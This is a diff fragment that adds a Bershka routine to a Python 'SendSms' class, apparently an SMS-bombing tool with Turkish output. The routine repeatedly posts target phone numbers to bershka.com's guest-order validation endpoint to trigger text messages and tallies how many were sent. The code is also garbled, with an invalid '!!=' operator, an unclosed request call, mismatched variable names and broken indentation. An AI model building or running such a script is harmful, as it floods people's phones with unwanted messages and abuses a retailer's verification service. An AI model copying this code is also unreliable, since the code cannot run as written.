@@ -185,6 +185,50 @@ class SendSms():
                     continue
 
         
+    #bershka.com
+def Bershka(self):
+
+liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+
+bos_olmayan = len([x for x in liste if x != "bos"])
+
+uygulanan_nolar = 0
+
+for numara in liste:
+
+if numara !!= "bos":
+
+  try:
+      Bershka = requests.post("https://www.bershka.com/tr/guest-orders-validation.html", data={
+ "email": self.mail
+  "phone": f"0{numara}"
+
+  if bershka.status_code == 202:
+
+ print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bershka.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                     
+
+                           self.adet += 1
+
+                        self.toplam_sms += 1
+
+                    else:
+
+                       raise
+
+                except:
+
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bershka.com "+numara)
+
+                uygulanan_nolar += 1
+        
+             if uygulanan_nolar == bos_olmayan:
+
+                    break
+
+                else:
+
+                    continue
 
 
 
